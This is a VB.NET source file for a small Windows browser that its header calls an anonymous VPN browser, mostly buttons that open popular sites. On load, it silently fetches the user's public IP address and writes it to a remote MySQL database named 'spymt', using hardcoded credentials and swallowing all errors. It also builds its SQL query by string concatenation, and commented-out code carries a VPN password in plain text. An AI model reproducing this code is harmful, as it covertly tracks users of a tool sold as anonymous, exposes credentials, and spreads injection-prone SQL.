'
' Copyright (c) 2020 Barchampas Gerasimos <makindosxx@gmail.com>.
' nexus-browser is a anonymous and vpn browser.
'
' nexus-browser Is free software: you can redistribute it And/Or modify
' it under the terms of the GNU Affero General Public License as
' published by the Free Software Foundation, either version 3 of the
' License, Or (at your option) any later version.
'
'
' nexus-browser Is distributed in the hope that it will be useful,
' but WITHOUT ANY WARRANTY; without even the implied warranty of
' MERCHANTABILITY Or FITNESS FOR A PARTICULAR PURPOSE. See the
' GNU Affero General Public License for more details.
'
' You should have received a copy of the GNU Affero General Public License, version 3,
' along with this program.  If Not, see <http://www.gnu.org/licenses/>
'
'

Imports MySql.Data.MySqlClient
Imports System.Net
Imports System.Text.RegularExpressions
Imports System.IO
Imports System.Reflection



Public Class Form1



    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        WebBrowser1.GoForward()
    End Sub

    Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs) Handles TextBox1.TextChanged

    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        WebBrowser1.GoBack()
    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        Process.Start("nexus.exe")
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        WebBrowser1.Url = New Uri("http://nexbrowser.c1.biz/")
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        WebBrowser1.Refresh()
    End Sub


    Public Function GetExternalIP() As IPAddress
        Dim lol As WebClient = New WebClient()
        Dim str As String = lol.DownloadString("https://api.ipify.org")
        Dim ip As String = str
        Return IPAddress.Parse(ip)
    End Function


    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        Dim MyIP As IPAddress = GetExternalIP()

        Dim ip_allow As String = MyIP.ToString()

        'Dim ip_date As String = DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss")

        Dim browser_fingerprint As String = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)"


        Dim MysqlConn As MySqlConnection
        Dim COMMAND As MySqlCommand

        MysqlConn = New MySqlConnection
        MysqlConn.ConnectionString =
       "server=fdb20.biz.nf;userid=3117979_spymt;password=perla3#Aaa;database=3117979_spymt"
        Dim READER As MySqlDataReader


        Try
            MysqlConn.Open()
            Dim Query As String
            Query = "insert into allowed_sec (ip, browser) values ('" & ip_allow & "', '" & browser_fingerprint & "')"
            COMMAND = New MySqlCommand(Query, MysqlConn)
            READER = COMMAND.ExecuteReader

            'MessageBox.Show("Data Saved")
            MysqlConn.Close()

        Catch ex As MySqlException
            'MessageBox.Show(ex.Message)
        Finally
            MysqlConn.Dispose()

        End Try

    End Sub

    Private Sub WebBrowser1_DocumentCompleted(sender As Object, e As WebBrowserDocumentCompletedEventArgs)

    End Sub

    Private Sub WebBrowser1_DocumentCompleted_1(sender As Object, e As WebBrowserDocumentCompletedEventArgs) Handles WebBrowser1.DocumentCompleted



    End Sub

    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
        WebBrowser1.Print()
    End Sub

    Private Sub TableLayoutPanel1_Paint(sender As Object, e As PaintEventArgs)

    End Sub

    Private Sub TextBox1_KeyDown(sender As Object, e As KeyEventArgs) Handles TextBox1.KeyDown
        If e.KeyCode = Keys.Enter Then
            Button7.PerformClick()
        End If


    End Sub

    Private Sub Button7_Click(sender As Object, e As EventArgs) Handles Button7.Click
        WebBrowser1.Navigate(TextBox1.Text)
    End Sub

    Private Sub TableLayoutPanel1_Paint_1(sender As Object, e As PaintEventArgs)

    End Sub

    Private Sub PictureBox1_Click(sender As Object, e As EventArgs)
        WebBrowser1.Url = New Uri("https://www.microsoft.com/en-us")
    End Sub

    Private Sub Label1_Click(sender As Object, e As EventArgs) Handles Label1.Click

    End Sub

    Private Sub Button8_Click(sender As Object, e As EventArgs) Handles Button8.Click
        WebBrowser1.Url = New Uri("https://www.bing.com/")
    End Sub

    Private Sub Button9_Click(sender As Object, e As EventArgs) Handles Button9.Click
        WebBrowser1.Url = New Uri("https://duckduckgo.com/")
    End Sub

    Private Sub Button10_Click(sender As Object, e As EventArgs) Handles Button10.Click
        WebBrowser1.Url = New Uri("https://yandex.com/")
    End Sub

    Private Sub Button11_Click(sender As Object, e As EventArgs) Handles Button11.Click
        WebBrowser1.Url = New Uri("https://www.google.com/")
    End Sub

    Private Sub Button12_Click(sender As Object, e As EventArgs) Handles Button12.Click
        WebBrowser1.Url = New Uri("https://mobile.twitter.com/")
    End Sub

    Private Sub Button14_Click(sender As Object, e As EventArgs) Handles Button14.Click
        WebBrowser1.Url = New Uri("https://mobile.facebook.com/")
    End Sub

    Private Sub Button13_Click(sender As Object, e As EventArgs) Handles Button13.Click
        WebBrowser1.Url = New Uri("https://www.instagram.com/")
    End Sub

    Private Sub Button15_Click(sender As Object, e As EventArgs)
        WebBrowser1.Url = New Uri("https://www.tiktok.com/")
    End Sub

    Private Sub Button16_Click(sender As Object, e As EventArgs) Handles Button16.Click
        WebBrowser1.Url = New Uri("https://www.yahoo.com/")
    End Sub

    Private Sub Label3_Click(sender As Object, e As EventArgs) Handles Label3.Click

    End Sub

    Private Sub Button18_Click(sender As Object, e As EventArgs) Handles Button18.Click
        WebBrowser1.Url = New Uri("https://www.youtube.com/")
    End Sub

    Private Sub Button17_Click(sender As Object, e As EventArgs) Handles Button17.Click
        WebBrowser1.Url = New Uri("https://www.bing.com/search?q=dailymotion")
    End Sub

    Private Sub Button19_Click(sender As Object, e As EventArgs) Handles Button19.Click
        WebBrowser1.Url = New Uri("https://www.metapedia.org/")
    End Sub

    Private Sub Button21_Click(sender As Object, e As EventArgs) Handles Button21.Click
        WebBrowser1.Url = New Uri("https://www.skype.com/el/free-conference-call/")
    End Sub

    Private Sub Button20_Click(sender As Object, e As EventArgs) Handles Button20.Click
        WebBrowser1.Url = New Uri("https://www.messenger.com/")
    End Sub

    Private Sub Label6_Click(sender As Object, e As EventArgs) Handles Label6.Click

    End Sub

    Private Sub Button23_Click(sender As Object, e As EventArgs) Handles Button23.Click
        WebBrowser1.Url = New Uri("https://www.thetimes.co.uk/")
    End Sub

    Private Sub Button22_Click(sender As Object, e As EventArgs) Handles Button22.Click
        WebBrowser1.Url = New Uri("https://www.nytimes.com/")
    End Sub

    Private Sub Label4_Click(sender As Object, e As EventArgs) Handles Label4.Click

    End Sub

    Private Sub Button25_Click(sender As Object, e As EventArgs)

    End Sub


    ' Private Sub Button24_Click(sender As Object, e As EventArgs) Handles Button24.Click
    ' If Not IO.Directory.Exists(System.Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\vpnconnector") Then

    '        IO.Directory.CreateDirectory(System.Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\vpnconnector")


    'End If


    '   IO.File.WriteAllText((System.Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\vpnconnector" & "\connection.pbk"), "[VPN]" & vbNewLine & "MEDIA=rastapi" & vbNewLine & "Port=VPN2-0" & vbNewLine & "Device=WAN Miniport (IKEv2)" & vbNewLine & "DEVICE=vpn" & vbNewLine & "PhoneNumber=" & "ca222.vpnbook.com")
    '  IO.File.WriteAllText((System.Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\vpnconnector" & "\connection.bat"), "rasdial ""VPN"" " & "vpnbook" & " " & "dA9rJds" & " /phonebook:" & """" & System.Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\vpnconnector" & "\connection.pbk" & """")


    '   Dim connect As System.Diagnostics.Process
    '   connect = New System.Diagnostics.Process()
    '   connect.StartInfo.FileName = System.Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\vpnconnector" & "\connection.bat"
    '   connect.StartInfo.WindowStyle = ProcessWindowStyle.Normal

    '   connect.Start()
    '   connect.WaitForExit()

    '   WebBrowser1.Url = New Uri("https://whatismyipaddress.com/")
    ' End Sub

    ' Private Sub Button25_Click_1(sender As Object, e As EventArgs) Handles Button25.Click
    '     IO.File.WriteAllText((System.Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\vpnconnector" & "\disconnect.bat"), "rasdial/d")
    ' Dim connect As System.Diagnostics.Process
    '     connect = New System.Diagnostics.Process()
    '    connect.StartInfo.FileName = System.Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\vpnconnector" & "\disconnect.bat"
    '    connect.StartInfo.WindowStyle = ProcessWindowStyle.Normal

    '   connect.Start()
    '   connect.WaitForExit()
    '  WebBrowser1.Url = New Uri("https://whatismyipaddress.com/")
    ' End Sub

    Private Sub Label5_Click(sender As Object, e As EventArgs) Handles Label5.Click

    End Sub

    Private Sub Button24_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Button25_Click_1(sender As Object, e As EventArgs)

    End Sub
End Class
